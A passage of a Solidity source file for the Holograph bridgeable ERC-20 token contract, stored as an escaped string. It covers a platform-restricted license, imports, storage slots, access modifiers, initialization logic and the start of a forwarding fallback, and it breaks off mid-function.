License- This license does not grant you rights\n to use any contributors’ name, logo, or trademarks.\n B) If you bring a patent claim against any contributor over\n patents that you claim are infringed by the software, your\n patent license from such contributor is terminated with\n immediate effect.\n C) If you distribute any portion of the software, you must\n retain all copyright, patent, trademark, and attribution\n notices that are present in the software.\n D) If you distribute any portion of the software in source code\n form, you may do so only under this license by including a\n complete copy of this license with your distribution. If you\n distribute any portion of the software in compiled or object\n code form, you may only do so under a license that complies\n with this license.\n E) The software is licensed “as-is.” You bear all risks of\n using it. The contributors give no express warranties,\n guarantees, or conditions. You may have additional consumer\n rights under your local laws which this license cannot change.\n To the extent permitted under your local laws, the contributors\n exclude all implied warranties, including those of\n merchantability, fitness for a particular purpose and\n non-infringement.\n\n 4. (F) Platform Limitation- The licenses granted in sections\n 2.A & 2.B extend only to the software or derivative works that\n you create that run on a Holograph system product.\n\n ***************************************************************\n\n*/\n\npragma solidity 0.8.13;\n\nimport \"../abstract/Admin.sol\";\nimport \"../abstract/EIP712.sol\";\nimport \"../abstract/Initializable.sol\";\nimport \"../abstract/NonReentrant.sol\";\nimport \"../abstract/Owner.sol\";\n\nimport \"../enum/HolographERC20Event.sol\";\nimport \"../enum/InterfaceType.sol\";\n\nimport \"../interface/ERC20.sol\";\nimport \"../interface/ERC20Burnable.sol\";\nimport \"../interface/HolographERC20Interface.sol\";\nimport \"../interface/ERC20Metadata.sol\";\nimport \"../interface/ERC20Permit.sol\";\nimport \"../interface/ERC20Receiver.sol\";\nimport \"../interface/ERC20Safer.sol\";\nimport \"../interface/ERC165.sol\";\nimport \"../interface/Holographable.sol\";\nimport \"../interface/HolographedERC20.sol\";\nimport \"../interface/HolographInterface.sol\";\nimport \"../interface/HolographerInterface.sol\";\nimport \"../interface/HolographRegistryInterface.sol\";\nimport \"../interface/InitializableInterface.sol\";\nimport \"../interface/HolographInterfacesInterface.sol\";\nimport \"../interface/Ownable.sol\";\n\nimport \"../library/ECDSA.sol\";\n\n/**\n * @title Holograph Bridgeable ERC-20 Token\n * @author CXIP-Labs\n * @notice A smart contract for minting and managing Holograph Bridgeable ERC20 Tokens.\n * @dev The entire logic and functionality of the smart contract is self-contained.\n */\ncontract HolographERC20 is Admin, Owner, Initializable, NonReentrant, EIP712, HolographERC20Interface {\n  /**\n   * @dev bytes32(uint256(keccak256('eip1967.Holograph.holograph')) - 1)\n   */\n  bytes32 constant _holographSlot = 0xb4107f746e9496e8452accc7de63d1c5e14c19f510932daa04077cd49e8bd77a;\n  /**\n   * @dev bytes32(uint256(keccak256('eip1967.Holograph.sourceContract')) - 1)\n   */\n  bytes32 constant _sourceContractSlot = 0x27d542086d1e831d40b749e7f5509a626c3047a36d160781c40d5acc83e5b074;\n\n  /**\n   * @dev Configuration for events to trigger for source smart contract.\n   */\n  uint256 private _eventConfig;\n\n  /**\n   * @dev Mapping of all the addresse's balances.\n   */\n  mapping(address => uint256) private _balances;\n\n  /**\n   * @dev Mapping of all authorized operators, and capped amounts.\n   */\n  mapping(address => mapping(address => uint256)) private _allowances;\n\n  /**\n   * @dev Total number of token in circulation.\n   */\n  uint256 private _totalSupply;\n\n  /**\n   * @dev Token name.\n   */\n  string private _name;\n\n  /**\n   * @dev Token ticker symbol.\n   */\n  string private _symbol;\n\n  /**\n   * @dev Token number of decimal places.\n   */\n  uint8 private _decimals;\n\n  /**\n   * @dev List of used up nonces. Used in the ERC20Permit interface functionality.\n   */\n  mapping(address => uint256) private _nonces;\n\n  /**\n   * @notice Only allow calls from bridge smart contract.\n   */\n  modifier onlyBridge() {\n    require(msg.sender == _holograph().getBridge(), \"ERC20: bridge only call\");\n    _;\n  }\n\n  /**\n   * @notice Only allow calls from source smart contract.\n   */\n  modifier onlySource() {\n    address sourceContract;\n    assembly {\n      sourceContract := sload(_sourceContractSlot)\n    }\n    require(msg.sender == sourceContract, \"ERC20: source only call\");\n    _;\n  }\n\n  /**\n   * @dev Constructor is left empty and init is used instead\n   */\n  constructor() {}\n\n  /**\n   * @notice Used internally to initialize the contract instead of through a constructor\n   * @dev This function is called by the deployer/factory when creating a contract\n   * @param initPayload abi encoded payload to use for contract initilaization\n   */\n  function init(bytes memory initPayload) external override returns (bytes4) {\n    require(!_isInitialized(), \"ERC20: already initialized\");\n    InitializableInterface sourceContract;\n    assembly {\n      sstore(_reentrantSlot, 0x0000000000000000000000000000000000000000000000000000000000000001)\n      sstore(_ownerSlot, caller())\n      sourceContract := sload(_sourceContractSlot)\n    }\n    (\n      string memory contractName,\n      string memory contractSymbol,\n      uint8 contractDecimals,\n      uint256 eventConfig,\n      string memory domainSeperator,\n      string memory domainVersion,\n      bool skipInit,\n      bytes memory initCode\n    ) = abi.decode(initPayload, (string, string, uint8, uint256, string, string, bool, bytes));\n    _name = contractName;\n    _symbol = contractSymbol;\n    _decimals = contractDecimals;\n    _eventConfig = eventConfig;\n    if (!skipInit) {\n      require(sourceContract.init(initCode) == InitializableInterface.init.selector, \"ERC20: could not init source\");\n    }\n    _setInitialized();\n    _eip712_init(domainSeperator, domainVersion);\n    return InitializableInterface.init.selector;\n  }\n\n  /**\n   * @dev Purposefully left empty, to prevent running out of gas errors when receiving native token payments.\n   */\n  receive() external payable {}\n\n  /**\n   * @notice Fallback to the source contract.\n   * @dev Any function call that is not covered here, will automatically be sent over to the source contract.\n   */\n  fallback() external payable {\n    assembly {\n      calldatacopy(0, 0, calldatasize())\n      mstore(calldatasize(), caller())\n      let result := call(gas(), sload(_sourceContractSlot), callvalue(), 0, add(calldatasize(), 32), 0, 0)\n      returndatacopy(0, 0, returndatasize())\n      switch result"
    }
  ]
}